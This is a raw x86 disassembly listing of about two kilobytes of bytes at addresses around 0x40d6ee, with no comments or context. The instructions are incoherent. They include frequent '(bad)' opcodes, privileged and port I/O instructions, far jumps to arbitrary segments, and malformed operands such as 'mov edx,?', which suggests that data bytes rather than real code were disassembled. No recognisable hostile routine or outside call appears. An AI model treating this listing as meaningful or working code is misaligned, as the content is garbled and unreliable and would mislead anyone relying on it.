  40d6ee:	add    bh,BYTE PTR [ecx+edx*8]
  40d6f1:	stos   DWORD PTR es:[edi],eax
  40d6f2:	cli    
  40d6f3:	adc    BYTE PTR [eax+ecx*1],0xe7
  40d6f7:	fs adc bl,ah
  40d6fa:	retf   
  40d6fb:	cld    
  40d6fc:	loopne 0x40d682
  40d6fe:	fwait
  40d6ff:	(bad)  
  40d700:	sub    DWORD PTR [eax-0x32e948e6],edi
  40d706:	dec    edi
  40d707:	out    0xda,eax
  40d709:	leave  
  40d70a:	add    DWORD PTR [ebx-0x5],0xffffff84
  40d70e:	jmp    0xe728:0x9a20afd4
  40d715:	gs or  eax,0x1fccb7c9
  40d71b:	fsubr  QWORD PTR [ecx]
  40d71d:	mov    dh,0x5
  40d71f:	inc    ebp
  40d720:	aas    
  40d721:	test   ch,0xa9
  40d724:	pop    ss
  40d725:	pop    ecx
  40d726:	mov    dh,0x13
  40d728:	mov    dl,0x4e
  40d72a:	rcr    ebx,cl
  40d72c:	mov    esi,tr2
  40d72f:	inc    esp
  40d730:	sbb    al,0x6
  40d732:	mov    cl,0x52
  40d734:	ins    DWORD PTR es:[edi],dx
  40d735:	inc    esp
  40d736:	adc    ecx,DWORD PTR [edx]
  40d738:	cwde   
  40d739:	mov    cs,esp
  40d73b:	call   0x8253:0xdd743143
  40d742:	jl     0x40d6e4
  40d744:	xor    BYTE PTR ds:0xcff94cbd,bh
  40d74a:	pop    esp
  40d74b:	lahf   
  40d74c:	xchg   ebp,eax
  40d74d:	xlat   BYTE PTR ds:[ebx]
  40d74e:	hlt    
  40d74f:	into   
  40d750:	sbb    BYTE PTR [edx+0x79],0x80
  40d754:	or     bl,dl
  40d756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d757:	sub    DWORD PTR [edi-0x6c],ebx
  40d75a:	mov    ebp,0x52b1f882
  40d75f:	inc    eax
  40d760:	rcr    bh,1
  40d762:	stc    
  40d763:	fidiv  WORD PTR [ebx-0x34]
  40d766:	push   esi
  40d767:	int    0x6e
  40d769:	std    
  40d76a:	out    dx,al
  40d76b:	lock (bad) 
  40d76d:	mov    al,0x5e
  40d76f:	mov    ecx,0xe35bed21
  40d774:	out    0x71,al
  40d776:	fisub  WORD PTR [eax+0x61e36e53]
  40d77c:	mov    ah,0x63
  40d77e:	in     eax,0xd5
  40d780:	or     ecx,ecx
  40d782:	push   esp
  40d783:	jmp    0x668d:0x948b323c
  40d78a:	sub    DWORD PTR [ebx+0x2982b739],ebx
  40d790:	enter  0xf0a9,0x99
  40d794:	adc    cl,0x61
  40d797:	mov    ebx,0x890c0818
  40d79c:	dec    ecx
  40d79d:	in     eax,0x41
  40d79f:	xor    BYTE PTR [eax],bh
  40d7a1:	test   DWORD PTR [ebx-0x423ba938],esp
  40d7a7:	out    dx,eax
  40d7a8:	push   ss
  40d7a9:	shr    BYTE PTR [ebp-0x2b],1
  40d7ac:	adc    ch,dh
  40d7ae:	cmp    BYTE PTR [ebx+0x5148ed83],0x56
  40d7b5:	out    dx,eax
  40d7b6:	in     eax,dx
  40d7b7:	xchg   ecx,eax
  40d7b8:	test   eax,0xd948b28e
  40d7bd:	ins    DWORD PTR es:[edi],dx
  40d7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7bf:	hlt    
  40d7c0:	icebp  
  40d7c1:	adc    esp,DWORD PTR [edi]
  40d7c3:	(bad)  
  40d7c4:	in     eax,0x5e
  40d7c6:	xchg   esi,eax
  40d7c7:	daa    
  40d7c8:	jmp    0x758cbdad
  40d7cd:	mov    DWORD PTR [ebp+0x47],0x779b7c0c
  40d7d4:	mov    eax,ds:0x62ed2015
  40d7d9:	ins    BYTE PTR es:[edi],dx
  40d7da:	or     eax,DWORD PTR [ebx+0x3e]
  40d7dd:	jmp    DWORD PTR [ebx]
  40d7df:	jecxz  0x40d773
  40d7e1:	adc    ch,0x7c
  40d7e4:	jmp    0xefbb:0xc3de2eb1
  40d7eb:	dec    esp
  40d7ec:	gs mov esp,0xb6062a4a
  40d7f2:	sbb    bl,ch
  40d7f4:	sub    al,0x5c
  40d7f6:	aad    0x9e
  40d7f8:	rcl    esp,cl
  40d7fa:	and    bl,BYTE PTR [edi+0x53]
  40d7fd:	xor    DWORD PTR [eax-0x640dac96],0xa2f0b30c
  40d807:	inc    ebx
  40d808:	jne    0x40d7fc
  40d80a:	lea    edi,[ebx+0x64]
  40d80d:	ds jnp 0x40d838
  40d810:	in     eax,0x34
  40d812:	test   al,0x23
  40d814:	dec    edx
  40d815:	cmp    BYTE PTR [ecx-0x4ed59a6d],bh
  40d81b:	and    bl,BYTE PTR [edi+ecx*2-0x7165c002]
  40d822:	dec    esi
  40d823:	cmp    eax,0x53cf8a6a
  40d828:	sbb    BYTE PTR [edx+0x66a82aff],al
  40d82e:	mov    ebx,0x6bfd3dc8
  40d833:	inc    esi
  40d834:	cmp    ecx,edx
  40d836:	pop    ss
  40d837:	(bad)
  40d83a:	femms  
  40d83c:	inc    edx
  40d83d:	sahf   
  40d83e:	inc    esp
  40d83f:	mov    edx,gs
  40d841:	cdq    
  40d842:	clc    
  40d843:	jno    0x40d80a
  40d845:	aas    
  40d846:	aad    0x89
  40d848:	cmp    al,0x94
  40d84a:	fsubr  QWORD PTR [ecx-0x65]
  40d84d:	iret   
  40d84e:	pop    eax
  40d84f:	or     al,0x1b
  40d851:	fwait
  40d852:	out    dx,eax
  40d853:	sbb    DWORD PTR [ebx],edx
  40d855:	rcl    BYTE PTR [edx-0x56],cl
  40d858:	sbb    esi,edi
  40d85a:	lods   al,BYTE PTR ds:[esi]
  40d85b:	jae    0x40d815
  40d85d:	pop    ss
  40d85e:	xchg   esi,eax
  40d85f:	push   esi
  40d860:	pop    es
  40d861:	daa    
  40d862:	hlt    
  40d863:	shl    BYTE PTR [esi],cl
  40d865:	(bad)  
  40d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d867:	cmp    eax,0xa7afb95f
  40d86c:	mov    ah,0x54
  40d86e:	inc    edi
  40d86f:	mov    ds:0xb75cfdae,al
  40d874:	pop    esp
  40d875:	aas    
  40d876:	jne    0x40d809
  40d878:	xchg   ebx,ebx
  40d87a:	adc    ecx,0x3a
  40d87d:	dec    eax
  40d87e:	popa   
  40d87f:	push   ss
  40d880:	adc    edi,DWORD PTR [esi]
  40d882:	mov    ebp,0x9230c510
  40d887:	call   0x9180ddc5
  40d88c:	mov    al,bh
  40d88e:	inc    eax
  40d88f:	pop    esp
  40d890:	(bad)  
  40d891:	mov    bh,0x17
  40d893:	lods   eax,DWORD PTR ds:[esi]
  40d894:	lock mov WORD PTR [esi],ds
  40d897:	pop    ebp
  40d898:	add    edx,DWORD PTR [edi+ebx*1+0x14af42ec]
  40d89f:	(bad)  
  40d8a0:	lock mov ebp,DWORD PTR [esi]
  40d8a3:	(bad)  
  40d8a4:	cmp    eax,0x2f640f2a
  40d8a9:	dec    ebp
  40d8aa:	or     eax,DWORD PTR ds:0x81f0a971
  40d8b0:	sub    BYTE PTR [edx+0x24],bh
  40d8b3:	dec    eax
  40d8b4:	mov    ah,0x1a
  40d8b6:	mov    eax,0x17306e33
  40d8bb:	ss loopne 0x40d8e2
  40d8be:	jp     0x40d933
  40d8c0:	pop    edx
  40d8c1:	test   DWORD PTR [ebx],edx
  40d8c3:	lahf   
  40d8c4:	sub    BYTE PTR [ebp-0x78],bh
  40d8c7:	in     eax,dx
  40d8c8:	sbb    BYTE PTR [eax-0x2b],ah
  40d8cb:	and    al,BYTE PTR [ebp+0x1c]
  40d8ce:	out    dx,al
  40d8cf:	dec    esi
  40d8d0:	(bad)  
  40d8d1:	shl    ecx,1
  40d8d3:	(bad)  
  40d8d5:	adc    DWORD PTR [edx+0x55],esp
  40d8d8:	mov    BYTE PTR [ebx],cl
  40d8da:	daa    
  40d8db:	test   al,0x1
  40d8dd:	shr    edx,1
  40d8df:	adc    BYTE PTR [ecx],bl
  40d8e1:	cmp    esp,DWORD PTR [eax-0x33716301]
  40d8e7:	sub    BYTE PTR [eax+0x38],dh
  40d8ea:	lock icebp 
  40d8ec:	ins    DWORD PTR es:[edi],dx
  40d8ed:	jo     0x40d8a5
  40d8ef:	cmc    
  40d8f0:	out    dx,al
  40d8f1:	add    BYTE PTR [esi-0x29],al
  40d8f4:	adc    eax,0xce5201e0
  40d8f9:	scas   eax,DWORD PTR es:[edi]
  40d8fa:	cli    
  40d8fb:	inc    esp
  40d8fc:	lahf   
  40d8fd:	scas   al,BYTE PTR es:[edi]
  40d8fe:	sti    
  40d8ff:	pop    edx
  40d900:	retf   
  40d901:	stos   BYTE PTR es:[edi],al
  40d902:	lahf   
  40d903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d904:	std    
  40d905:	and    eax,0x3ad999e3
  40d90a:	shr    BYTE PTR [edi-0x78],1
  40d90d:	mov    bh,0x52
  40d90f:	gs ins BYTE PTR es:[edi],dx
  40d911:	dec    eax
  40d912:	pop    esi
  40d913:	es inc ecx
  40d915:	in     al,0x3f
  40d917:	(bad)  
  40d918:	sub    eax,0x95270d48
  40d91d:	mov    DWORD PTR [ecx+edi*8+0x5c],ebp
  40d921:	imul   esi,edi,0x616dc8f7
  40d927:	xor    eax,0x371853d1
  40d92c:	cmp    eax,0x7236841a
  40d931:	out    0x81,al
  40d933:	mov    ecx,0xc2d65a14
  40d938:	shl    DWORD PTR [edx],1
  40d93a:	push   ds
  40d93b:	push   ds
  40d93c:	push   ds
  40d93d:	add    bl,BYTE PTR [edi+0x14d80a5c]
  40d943:	jecxz  0x40d938
  40d945:	pop    ss
  40d946:	imul   ebx,DWORD PTR [ebx-0x31],0xffffffaf
  40d94a:	out    0xc1,eax
  40d94c:	sar    ah,0xe2
  40d94f:	sub    BYTE PTR [eax+0x35],dh
  40d952:	jl     0x40d97d
  40d954:	mov    esp,0x3b4f0ecd
  40d959:	xor    DWORD PTR [eax-0xc],0xc595b970
  40d960:	dec    esp
  40d961:	mov    esp,0xb28b499a
  40d966:	repnz add DWORD PTR [ebx+0x67],esp
  40d96a:	sti    
  40d96b:	jb     0x40d981
  40d96d:	sti    
  40d96e:	cmp    cl,BYTE PTR [ebx+esi*4+0x72668270]
  40d975:	sbb    BYTE PTR ds:0x16ad0d11,cl
  40d97b:	push   esi
  40d97c:	stos   BYTE PTR es:[edi],al
  40d97d:	push   esi
  40d97e:	cmp    DWORD PTR [edx+0x743d8c21],esp
  40d984:	xor    DWORD PTR [edx-0x6c512787],0xda21ee29
  40d98e:	or     eax,ebx
  40d990:	xchg   DWORD PTR [ebx-0x79],esp
  40d993:	push   ss
  40d994:	inc    eax
  40d995:	cmp    bh,al
  40d997:	sub    al,BYTE PTR [ebx+edx*1+0x0]
  40d99b:	xchg   dl,bh
  40d99d:	cmp    eax,0x7c9afbe5
  40d9a2:	out    0xbb,eax
  40d9a4:	mov    al,ds:0x79163b8a
  40d9a9:	pop    esi
  40d9aa:	mov    al,0x4d
  40d9ac:	push   ebx
  40d9ad:	cmp    al,0x25
  40d9af:	inc    ebp
  40d9b0:	lock out 0x43,al
  40d9b3:	retf   
  40d9b4:	test   edi,esp
  40d9b6:	mov    ch,BYTE PTR [ecx+edi*4]
  40d9b9:	xchg   esp,eax
  40d9ba:	inc    esp
  40d9bb:	lea    eax,[ebx]
  40d9bd:	xor    DWORD PTR [ebx],ecx
  40d9bf:	and    al,0x28
  40d9c1:	or     ch,BYTE PTR [ebp-0x42e78465]
  40d9c7:	in     eax,0x24
  40d9c9:	cmp    ah,BYTE PTR [ebp+0x5b9ff22f]
  40d9cf:	cmp    BYTE PTR [eax+ecx*2+0xad8c069],0xb1
  40d9d7:	scas   al,BYTE PTR es:[edi]
  40d9d8:	push   0x3c0c0710
  40d9dd:	ins    DWORD PTR es:[edi],dx
  40d9de:	mov    eax,ds:0x5bf6ade
  40d9e3:	xlat   BYTE PTR ds:[ebx]
  40d9e4:	mov    bh,0x19
  40d9e6:	imul   esi,DWORD PTR [ebp+edx*8-0x6c4c19ea],0xce93e6a7
  40d9f1:	aam    0x51
  40d9f3:	mov    eax,ds:0x9ec8c1c1
  40d9f8:	xchg   cl,cl
  40d9fa:	ret    0x86f1
  40d9fd:	adc    al,0xe6
  40d9ff:	inc    eax
  40da00:	sub    eax,0xaf8ab7b8
  40da05:	lods   eax,DWORD PTR ds:[esi]
  40da06:	add    BYTE PTR [edi],al
  40da08:	mov    BYTE PTR [ebp-0x5b],ah
  40da0b:	rol    ch,0x86
  40da0e:	int3   
  40da0f:	push   cs
  40da10:	ficomp WORD PTR ds:0x7ec89694
  40da16:	ins    BYTE PTR es:[edi],dx
  40da17:	cmp    al,0x5a
  40da19:	out    dx,al
  40da1a:	test   eax,0xc68ad375
  40da1f:	sub    DWORD PTR [ecx],edi
  40da21:	mov    al,0xcb
  40da23:	je     0x40da1a
  40da25:	cmp    eax,0xaa0c75ec
  40da2a:	les    esi,FWORD PTR [esi-0x7386e8de]
  40da30:	pop    edx
  40da31:	not    BYTE PTR [ecx]
  40da33:	or     BYTE PTR [ecx-0x7f75a45],0xe3
  40da3a:	jne    0x40da63
  40da3c:	je     0x40da8d
  40da3e:	jmp    0x40da19
  40da40:	rcr    BYTE PTR [ebx-0x31],0x57
  40da44:	enter  0x5328,0x76
  40da48:	adc    eax,0x7539552f
  40da4d:	repz popa 
  40da4f:	jb     0x40d9f3
  40da51:	ins    BYTE PTR es:[edi],dx
  40da52:	fimul  WORD PTR [edi-0x3b]
  40da55:	cmp    eax,0xe3d6da54
  40da5a:	data16 sti 
  40da5c:	cld    
  40da5d:	stc    
  40da5e:	sub    edi,DWORD PTR [edx+edx*1-0x71a847b5]
  40da65:	sub    bh,BYTE PTR [edx]
  40da67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da68:	jl     0x40da03
  40da6a:	ficom  DWORD PTR [edx+0x2d]
  40da6d:	dec    esi
  40da6e:	int3   
  40da6f:	dec    ecx
  40da70:	xchg   edx,eax
  40da71:	popa   
  40da72:	mov    dl,ah
  40da74:	inc    ebx
  40da75:	sti    
  40da76:	call   0xfec8:0x20d818a2
  40da7d:	enter  0x5e87,0x26
  40da81:	add    al,0x11
  40da83:	or     DWORD PTR [esi+0x40],ebp
  40da86:	mov    ds:0xa7e233ea,al
  40da8b:	jmp    0x1b59:0x54e03a61
  40da92:	fidiv  WORD PTR [eax-0x77]
  40da95:	inc    ebp
  40da96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da97:	adc    DWORD PTR [edx+0x59aeba01],ebp
  40da9d:	sbb    eax,0xa3f6fb48
  40daa2:	sub    BYTE PTR ds:0xe1f97984,dl
  40daa8:	cmp    esi,DWORD PTR [ecx-0x2861ffd3]
  40daae:	dec    ebx
  40daaf:	ds data16 lahf 
  40dab2:	push   edx
  40dab3:	lahf   
  40dab4:	jnp    0x40daad
  40dab6:	adc    eax,edi
  40dab8:	mov    WORD PTR fs:[ebp+0x28fb05ca],fs
  40dabf:	xchg   ebp,eax
  40dac0:	data16 rcl BYTE PTR [ebp-0x20bc2332],cl
  40dac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dac8:	add    BYTE PTR [ebx],bl
  40daca:	jb     0x40dab8
  40dacc:	add    ah,al
  40dace:	jge    0x40dac3
  40dad0:	inc    ebp
  40dad1:	stos   BYTE PTR es:[edi],al
  40dad2:	cmp    BYTE PTR [edi],dh
  40dad4:	push   edx
  40dad5:	(bad)  
  40dad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dad7:	push   cs
  40dad8:	int    0xcd
  40dada:	mov    ecx,0x38bd02f9
  40dadf:	xchg   ebx,eax
  40dae0:	mov    BYTE PTR [edi+edi*8+0x7cf03732],ah
  40dae7:	dec    esi
  40dae8:	push   ebx
  40dae9:	xchg   DWORD PTR [edx-0xc703bed],esi
  40daef:	and    eax,0x73ff5f3a
  40daf4:	pop    esp
  40daf5:	dec    edx
  40daf6:	and    eax,0x3d67c7b4
  40dafb:	sub    dh,bh
  40dafd:	dec    ebp
  40dafe:	scas   al,BYTE PTR es:[edi]
  40daff:	rcr    BYTE PTR [edi],1
  40db01:	sbb    DWORD PTR [ecx-0x35],esi
  40db04:	nop
  40db05:	xor    eax,0x99d2d883
  40db0a:	push   0xe7eb41b7
  40db0f:	scas   eax,DWORD PTR es:[edi]
  40db10:	mov    edx,0xbc1489bc
  40db15:	add    al,0x28
  40db17:	or     dh,BYTE PTR [edi+0x765f2bdf]
  40db1d:	out    0x3c,eax
  40db1f:	sbb    BYTE PTR [eax],0x0
  40db22:	sub    ecx,DWORD PTR [edi]
  40db24:	mov    edx,?
  40db26:	mov    edx,0x11699647
  40db2b:	and    al,0x36
  40db2d:	xlat   BYTE PTR ds:[ebx]
  40db2e:	jnp    0x40db87
  40db30:	aam    0xa3
  40db32:	fld    QWORD PTR [edi+0x6b7b4daf]
  40db38:	sahf   
  40db39:	mov    al,0xe1
  40db3b:	scas   eax,DWORD PTR es:[edi]
  40db3c:	xor    esi,DWORD PTR [esi+0x31]
  40db3f:	loop   0x40db1b
  40db41:	mov    dl,BYTE PTR [eax]
  40db43:	idiv   BYTE PTR [ebp+0x72]
  40db46:	dec    ecx
  40db47:	add    bl,al
  40db49:	sub    BYTE PTR [ecx+0x6c],ch
  40db4c:	sbb    ah,BYTE PTR [esp+edi*1]
  40db4f:	bnd jno 0x40db99
  40db52:	(bad)  
  40db53:	ins    DWORD PTR es:[edi],dx
  40db54:	mov    bh,0xb1
  40db56:	aas    
  40db57:	adc    al,0xb0
  40db59:	ins    BYTE PTR es:[edi],dx
  40db5a:	hlt    
  40db5b:	mov    ebx,0xc7eaf872
  40db60:	repnz pop ebx
  40db62:	fsubp  st(3),st
  40db64:	leave  
  40db65:	ret    
  40db66:	and    al,0x21
  40db68:	fistp  WORD PTR [edx-0x6c]
  40db6b:	push   ebp
  40db6c:	xor    eax,0x1869d0b2
  40db71:	stos   BYTE PTR es:[edi],al
  40db72:	pop    es
  40db73:	add    al,0x5a
  40db75:	pop    ebx
  40db76:	(bad)  [eax-0x10]
  40db79:	adc    eax,0xbe5cd5e5
  40db7e:	(bad)  
  40db7f:	pop    ebx
  40db80:	mov    edi,0x290af1e9
  40db85:	out    0x3c,eax
  40db87:	into   
  40db88:	xchg   ebp,eax
  40db89:	dec    edi
  40db8a:	loope  0x40db6b
  40db8c:	jmp    0x64ccab30
  40db91:	loope  0x40db22
  40db93:	cmp    DWORD PTR [ebx],eax
  40db95:	xchg   BYTE PTR [ebp-0x10],ah
  40db98:	jnp    0x40db79
  40db9a:	adc    DWORD PTR [ebp+0x52],edi
  40db9d:	popf   
  40db9e:	popa   
  40db9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dba0:	iret   
  40dba1:	retf   0x4c8d
  40dba4:	fnstenv [eax+esi*1-0x4d]
  40dba8:	test   bl,ah
  40dbaa:	jle    0x40db35
  40dbac:	mov    edi,0x5d266a54
  40dbb1:	xchg   edi,eax
  40dbb2:	xor    dl,BYTE PTR [ecx+ebx*1+0x60]
  40dbb6:	shl    BYTE PTR [esi+0x355f4705],1
  40dbbc:	std    
  40dbbd:	jne    0x40db90
  40dbbf:	pop    esp
  40dbc0:	cmp    dh,al
  40dbc2:	ret    0x39f
  40dbc5:	push   0xffffffb7
  40dbc7:	cmp    BYTE PTR [ecx],dh
  40dbc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbca:	sar    dl,0x55
  40dbcd:	ins    DWORD PTR es:[edi],dx
  40dbce:	aas    
  40dbcf:	mov    al,ds:0x345229c4
  40dbd4:	mov    ch,0xec
  40dbd6:	hlt    
  40dbd7:	fxch   st(4)
  40dbd9:	aam    0xc0
  40dbdb:	add    bl,al
  40dbdd:	repz or al,0x2
  40dbe0:	outs   dx,BYTE PTR ds:[esi]
  40dbe1:	cmp    eax,DWORD PTR [ecx-0x5d27a4de]
  40dbe7:	cli    
  40dbe8:	ja     0x40dc2e
  40dbea:	mov    eax,ds:0x24221ee8
  40dbef:	sbb    BYTE PTR [ebx],0x35
  40dbf2:	mov    ebx,0x5b777b6
  40dbf7:	aas    
  40dbf8:	ret    0xee39
  40dbfb:	les    esi,FWORD PTR [ebx-0xbff8bbf]
  40dc01:	push   edx
  40dc02:	push   es
  40dc03:	shl    esp,cl
  40dc05:	push   ss
  40dc06:	ret    
  40dc07:	ret    
  40dc08:	shl    BYTE PTR [ebp-0x2a],0xd2
  40dc0c:	popf   
  40dc0d:	push   esp
  40dc0e:	dec    edi
  40dc0f:	hlt    
  40dc10:	outs   dx,DWORD PTR ds:[esi]
  40dc11:	mov    bl,0x76
  40dc13:	out    0x5f,al
  40dc15:	je     0x40dbe3
  40dc17:	das    
  40dc18:	push   cs
  40dc19:	fldz   
  40dc1b:	ret    
  40dc1c:	push   edi
  40dc1d:	test   al,0x64
  40dc1f:	popa   
  40dc20:	mov    ebx,DWORD PTR [edi+0x1012a976]
  40dc26:	xor    BYTE PTR [esi+0x8],ch
  40dc29:	adc    esi,DWORD PTR ds:0xe02e9f3b
  40dc2f:	pop    esi
  40dc30:	sbb    al,0x40
  40dc32:	in     eax,dx
  40dc33:	enter  0x32c9,0xf
  40dc37:	cli    
  40dc38:	rcr    BYTE PTR ds:0xfef71ce3,1
  40dc3e:	in     eax,dx
  40dc3f:	out    0xbb,al
  40dc41:	xchg   edi,eax
  40dc42:	arpl   WORD PTR [esi],cx
  40dc44:	pushf  
  40dc45:	scas   al,BYTE PTR es:[edi]
  40dc46:	bound  edi,QWORD PTR [ebx+0x6f]
  40dc49:	or     BYTE PTR [ecx+ebx*4],bl
  40dc4c:	sub    BYTE PTR [ecx+0x78],ah
  40dc4f:	jge    0x40dbf1
  40dc51:	xchg   ebp,eax
  40dc52:	pop    edx
  40dc53:	dec    esi
  40dc54:	adc    eax,0xbf874936
  40dc59:	xor    BYTE PTR [eax+0x4b3b80ce],0x3f
  40dc60:	(bad)  
  40dc61:	sbb    DWORD PTR [edx-0x61],ebp
  40dc64:	jb     0x40dc39
  40dc66:	xchg   BYTE PTR [eax-0x734f63c9],dh
  40dc6c:	mov    ecx,0x2a211af9
  40dc71:	pop    edi
  40dc72:	xchg   BYTE PTR [eax],dl
  40dc74:	sbb    al,0x12
  40dc76:	push   0xc796f04d
  40dc7b:	call   0xc950143c
  40dc80:	jae    0x40dc3e
  40dc82:	xor    cl,dl
  40dc84:	mov    esi,0x12274831
  40dc89:	sub    BYTE PTR [ebx],dh
  40dc8b:	inc    edi
  40dc8c:	add    DWORD PTR [ecx],esp
  40dc8e:	xor    al,0xe4
  40dc90:	lods   eax,DWORD PTR ds:[esi]
  40dc91:	inc    edi
  40dc92:	jne    0x40dd0e
  40dc94:	push   0x37d11da1
  40dc99:	mov    ebp,es
  40dc9b:	dec    edx
  40dc9c:	dec    ecx
  40dc9d:	pushf  
  40dc9e:	aaa    
  40dc9f:	hlt    
  40dca0:	xor    al,0x5c
  40dca2:	jle    0x40dd1e
  40dca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca5:	push   ebx
  40dca6:	sbb    BYTE PTR [edx+0x308df0b4],ah
  40dcac:	push   cs
  40dcad:	mov    edi,0xb8bc566a
  40dcb3:	lock xchg esi,eax
  40dcb5:	jmp    0x40c7:0xdba7ed9a
  40dcbc:	dec    ebx
  40dcbd:	in     al,0xfa
  40dcbf:	jo     0x40dcfc
  40dcc1:	pop    eax
  40dcc2:	hlt    
  40dcc3:	ins    DWORD PTR es:[edi],dx
  40dcc4:	ret    
  40dcc5:	loopne 0x40dcde
  40dcc7:	or     ch,BYTE PTR [esi-0x31]
  40dcca:	fucomp st(3)
  40dccc:	lock mov DWORD PTR [ebx+0x4249d74c],esi
  40dcd3:	mov    edx,0x9042665c
  40dcd8:	add    esp,DWORD PTR [ebx]
  40dcda:	(bad)  
  40dcdb:	push   0x7d
  40dcdd:	retf   
  40dcde:	repnz or bh,BYTE PTR [esi]
  40dce1:	push   cs
  40dce2:	mov    al,0x6c
  40dce4:	add    DWORD PTR [edx],ebp
  40dce6:	dec    edi
  40dce7:	mov    al,ds:0x2e9da8e6
  40dcec:	xlat   BYTE PTR ds:[ebx]
  40dced:	fdivr  st,st(7)
  40dcef:	repnz iret 
  40dcf1:	sbb    al,dl
  40dcf3:	scas   al,BYTE PTR es:[edi]
  40dcf4:	stc    
  40dcf5:	leave  
  40dcf6:	adc    esi,DWORD PTR [edi+0x4a466852]
  40dcfc:	jl     0x40dc8c
  40dcfe:	fs jmp 0x40dd1b
  40dd01:	pop    ss
  40dd02:	and    BYTE PTR [eax-0x7f],dh
  40dd05:	pop    edi
  40dd06:	add    BYTE PTR [edx-0x10d7a7a3],0x51
  40dd0d:	je     0x40dcdc
  40dd0f:	fsub   DWORD PTR [eax-0x28]
  40dd12:	jnp    0x40dccb
  40dd14:	in     al,0xb6
  40dd16:	and    al,0x7c
  40dd18:	sub    esi,eax
  40dd1a:	es xchg edi,eax
  40dd1c:	cli    
  40dd1d:	mul    DWORD PTR [ebx+0x7d]
  40dd20:	or     dh,ah
  40dd22:	pushf  
  40dd23:	push   0xbadf1f02
  40dd28:	pop    ecx
  40dd29:	mov    bl,0x22
  40dd2b:	iret   
  40dd2c:	push   0xfa2efee3
  40dd31:	mov    eax,0xa071b214
  40dd36:	push   ebx
  40dd37:	pop    es
  40dd38:	adc    al,0x1a
  40dd3a:	rol    DWORD PTR [eax+0x41],1
  40dd3d:	and    eax,0x920cab2b
  40dd42:	and    eax,0x3246c99c
  40dd47:	and    ebx,edi
  40dd49:	xor    edi,edi
  40dd4b:	and    BYTE PTR [ecx],bh
  40dd4d:	pop    ss
  40dd4e:	inc    edi
  40dd4f:	nop
  40dd50:	aam    0xe0
  40dd52:	rcl    BYTE PTR [edi+0x7b1b3082],0x18
  40dd59:	add    ch,BYTE PTR [edi+eiz*8+0x24edf8f3]
  40dd60:	cli    
  40dd61:	ret    0xe68f
  40dd64:	loop   0x40dd9e
  40dd66:	hlt    
  40dd67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd68:	dec    edi
  40dd69:	popa   
  40dd6a:	test   al,0xde
  40dd6c:	into   
  40dd6d:	mov    edi,0x3ed1f3a1
  40dd72:	jns    0x40dd3f
  40dd74:	mov    ah,0xb8
  40dd76:	test   al,0x31
  40dd78:	enter  0xd6c3,0xc0
  40dd7c:	clc    
  40dd7d:	test   BYTE PTR [ecx+0x7cfe1d84],ch
  40dd83:	imul   BYTE PTR ds:0x36ae44cd
  40dd89:	ret    
  40dd8a:	mov    ebx,DWORD PTR [ebp+0x50c91d06]
  40dd90:	imul   ecx,DWORD PTR [ebp+0x55],0xffffffe0
  40dd94:	mov    ebp,0x29737088
  40dd99:	call   0x2afb6a3
  40dd9e:	inc    edi
  40dd9f:	add    al,0x43
  40dda1:	push   edi
  40dda2:	and    esp,DWORD PTR [ebx+eax*4+0x68]
  40dda6:	js     0x40ddb0
  40dda8:	repz or ebx,0x9c051d6a
  40ddaf:	std    
  40ddb0:	mov    edx,0xa29a3518
  40ddb5:	and    esp,edx
  40ddb7:	jg     0x40dd3e
  40ddb9:	frstor [edi-0x57]
  40ddbc:	or     edi,DWORD PTR [ecx-0x74]
  40ddbf:	dec    edi
  40ddc0:	jle    0x40dd7a
  40ddc2:	pop    ss
  40ddc3:	add    BYTE PTR [ebp-0x6f78095e],0x17
  40ddca:	sbb    eax,DWORD PTR [ebx+eiz*4-0x2c]
  40ddce:	pop    edx
  40ddcf:	pop    esp
  40ddd0:	popa   
  40ddd1:	jge    0x40dd96
  40ddd3:	pop    ds
  40ddd4:	dec    edx
  40ddd5:	cmp    edi,ecx
  40ddd7:	call   0x8197:0x3fda5d50
  40ddde:	xor    al,0xb
  40dde0:	pop    ebx
  40dde1:	xor    eax,0xbf0a9dfe
  40dde6:	jmp    0xc9c85bed
  40ddeb:	mov    edx,0x88fd8710
  40ddf0:	sar    BYTE PTR [ebx+edi*8],0xf4
  40ddf4:	mov    esp,0x8c29821e
  40ddf9:	sub    edx,eax
  40ddfb:	data16 test BYTE PTR [edi],cl
  40ddfe:	push   ebp
  40ddff:	push   esi
  40de00:	cmp    eax,0x8af384b0
  40de05:	xchg   ecx,eax
  40de06:	dec    eax
  40de07:	out    dx,al
  40de08:	sbb    eax,0xd494105b
  40de0d:	or     al,0xa4
  40de0f:	imul   ecx,ebp,0x61ad363f
  40de15:	mov    ebp,0xf7d9d67b
  40de1a:	stos   BYTE PTR es:[edi],al
  40de1b:	push   edx
  40de1c:	jbe    0x40de17
  40de1e:	mov    ebp,0xe95d4270
  40de23:	xchg   ecx,eax
  40de24:	push   es
  40de25:	fmul   QWORD PTR [edi*8+0x59ec92fb]
  40de2c:	sub    DWORD PTR [ecx+ebp*2-0x5f],0xffffffe3
  40de31:	push   es
  40de32:	(bad)  
  40de33:	xor    eax,0x2ac03d2d
  40de38:	dec    edi
  40de39:	(bad)  
  40de3a:	in     eax,dx
  40de3b:	mov    ebx,0xae31eae0
  40de40:	into   
  40de41:	mov    ch,0xb7
  40de43:	cmp    DWORD PTR [esi+edi*1+0xb5c031b],esp
  40de4a:	mov    esi,0x8167b2b1
  40de4f:	lahf   
  40de50:	(bad)  
  40de51:	add    ecx,eax
  40de53:	xor    al,ah
  40de55:	jnp    0x40dde9
  40de57:	jmp    0xa3d0f8f8
  40de5c:	cld    
  40de5d:	dec    ecx
  40de5e:	popa   
  40de5f:	les    esi,FWORD PTR [esi]
  40de61:	jmp    0x40de45
  40de63:	rol    DWORD PTR [ecx+edi*4],0xfe
  40de67:	jl     0x40debf
  40de69:	inc    ebp
  40de6a:	mov    ds:0xcad506b0,al
